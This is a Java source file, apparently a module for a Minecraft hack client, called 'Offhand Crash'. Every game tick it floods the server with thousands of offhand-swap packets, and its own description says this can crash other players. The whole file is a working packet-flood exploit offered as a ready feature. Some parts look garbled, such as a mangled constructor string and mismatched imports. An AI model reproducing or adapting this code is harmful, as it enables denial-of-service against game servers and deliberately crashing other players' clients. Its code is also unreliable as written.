/*
 * Copyright (c) 2014-2021 Wurst-Imperium and contributors.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.hacks;

import net.wurstclient.Category;
import net.wurstclient.hack.Hack;
import net.wurstclient.settings.CheckboxSetting;
import net.wurstclient.settings.SliderSetting;
import net.wurstclient.settings.SliderSetting.ValueDisplay;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import io.netty.channel.Channel;
import net.wurstclient.TickEvent;
import net.wurstclient.event.EventHandler;
import net.wurstclient.ClientConnectionAccessor;

public class OffhandCrashHack extends Hack {


    private final CheckboxSetting doCrash = new CheckboxSetting(
    		"Do crash", "Sends X number of offhand swap sound packets to the server per tick", true);
           
  
    private final SliderSetting speed =  new SliderSetting("Speed",
			"The amount of swaps measured in ticks!",
			2000, 1, 10000, 1, ValueDisplay.INTEGER);
           
            

    private final CheckboxSetting antiCrash = new CheckboxSetting(
			"Anti Crash", "Attempts to prevent you from crashing yourself", true);
            
            
    public OffhandCrashHack() 
	{
		super("Offhand Crash", "offhand-crash\", \"An exploit that can crash other players by swapping back and forth between your main hand and offhand");
		setCategory(Category.OTHER);
		
		addSetting(doCrash);
		addSetting(speed);
		addSetting(antiCrash);
  
    }


    private static final PlayerActionC2SPacket PACKET = new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, new BlockPos(0, 0, 0) , Direction.UP);

   @EventHandler(priority = 0)
	private void onTick(TickEvent.Post event) {
      if (doCrash.isChecked()) {
                Channel channel = ((ClientConnectionAccessor) MC.player.networkHandler.getConnection()).getChannel();
                for (int i = 0; i < speed.getValue(); ++i) channel.write(PACKET);
                channel.flush();
        }
    }

    public boolean isAntiCrash() {
        return antiCrash.isChecked();
    }
}